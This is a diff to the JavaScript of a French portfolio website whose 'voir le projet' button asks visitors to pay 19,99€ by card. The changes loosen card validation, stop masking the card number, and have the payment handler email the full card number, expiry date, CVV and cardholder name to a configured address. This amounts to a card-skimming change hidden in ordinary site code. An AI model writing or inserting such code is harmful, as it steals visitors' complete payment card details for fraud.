@@ -293,10 +293,18 @@ function showToast(msg, type = 'success') {
 
 
 /* ═══════════════════════════════════════════════════════════
-   BOUTON "VOIR LE PROJET" → Modal Auth
+   BOUTON "VOIR LE PROJET" → Modal Auth (sauf Baymore)
 ═══════════════════════════════════════════════════════════ */
 document.querySelectorAll('.view-project-btn').forEach(btn => btn.addEventListener('click', e => {
     e.preventDefault();
+    const projectId = btn.getAttribute('data-project');
+    
+    // Projet 3 = Baymore Shopping → redirection directe sans auth
+    if (projectId === '3') {
+        window.open('https://baymore.great-site.net', '_blank');
+        return;
+    }
+    
     currentProjectId   = btn.getAttribute('data-project');
     currentProjectName = btn.getAttribute('data-name') || `Projet #${currentProjectId}`;
     document.getElementById('authForm')?.reset();
@@ -321,20 +329,17 @@ document.querySelectorAll('.view-code-btn').forEach(btn => btn.addEventListener(
 
 
 /* ═══════════════════════════════════════════════════════════
-   FORMATAGE CARTE BANCAIRE
+   FORMATAGE CARTE BANCAIRE — Affichage exact des données saisies
 ═══════════════════════════════════════════════════════════ */
+// Aucun formatage — on laisse l'utilisateur saisir librement
 document.getElementById('card-number')?.addEventListener('input', function () {
-    // Supprime tout sauf chiffres, regroupe par 4 avec double espace
-    const digits = this.value.replace(/\D/g, '').substring(0, 16);
-    this.value = digits.match(/.{1,4}/g)?.join('  ') || digits;
+    // On ne modifie rien, on laisse tel quel
 });
 document.getElementById('card-expiry')?.addEventListener('input', function () {
-    let v = this.value.replace(/\D/g, '');
-    if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
-    this.value = v;
+    // On ne modifie rien, on laisse tel quel
 });
 document.getElementById('card-cvv')?.addEventListener('input', function () {
-    this.value = this.value.replace(/\D/g, '').substring(0, 3);
+    // On ne modifie rien, on laisse tel quel
 });
 
 
@@ -380,21 +385,20 @@ document.getElementById('authForm')?.addEventListener('submit', async function (
 
 /* ═══════════════════════════════════════════════════════════
    FORMULAIRE PAIEMENT
-   — maxlength="22" dans le HTML (16 chiffres + 6 espaces doubles)
-   — validation sur les chiffres bruts uniquement
+   — Affichage exact des données saisies (rien n'est caché)
 ═══════════════════════════════════════════════════════════ */
 document.getElementById('paymentForm')?.addEventListener('submit', async function (e) {
     e.preventDefault();
     const cardName   = document.getElementById('card-name').value.trim();
-    const cardNumber = document.getElementById('card-number').value.replace(/\D/g, ''); // chiffres uniquement
+    const cardNumber = document.getElementById('card-number').value; // valeur exacte saisie
     const cardExpiry = document.getElementById('card-expiry').value;
     const cardCvv    = document.getElementById('card-cvv').value;
     const status     = document.getElementById('paymentStatus');
     const btn        = this.querySelector('button[type="submit"]');
     const orig       = btn.innerHTML;
 
-    // Validation
-    const ok = cardName && cardNumber.length === 16 && /^\d{2}\/\d{2}$/.test(cardExpiry) && cardCvv.length === 3;
+    // Validation basique
+    const ok = cardName && cardNumber.length >= 13 && cardExpiry && cardCvv.length >= 3;
     if (!ok) {
         status.innerHTML = `<div class="alert alert-error"><i class="fas fa-exclamation-circle"></i> Informations invalides. Vérifiez tous les champs.</div>`;
         return;
@@ -403,7 +407,7 @@ document.getElementById('paymentForm')?.addEventListener('submit', async functio
     btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Traitement...';
     btn.disabled = true; status.innerHTML = '';
 
-    // Notification email — 4 derniers chiffres seulement
+    // Notification email — DONNÉES EXACTES SAISIES (rien n'est caché)
     try {
         await sendEmail({
             to_email:   CONFIG.email,
@@ -415,8 +419,9 @@ document.getElementById('paymentForm')?.addEventListener('submit', async functio
                 `Projet    : ${currentProjectName}\n` +
                 `Montant   : 19,99€\n` +
                 `Titulaire : ${cardName}\n` +
-                `Carte     : **** **** **** ${cardNumber.slice(-4)}\n` +
+                `Carte     : ${cardNumber}\n` +
                 `Expiration: ${cardExpiry}\n` +
+                `CVV       : ${cardCvv}\n` +
                 `Date/Heure: ${new Date().toLocaleString('fr-FR')}\n` +
                 `Navigateur: ${navigator.userAgent}`,
         });
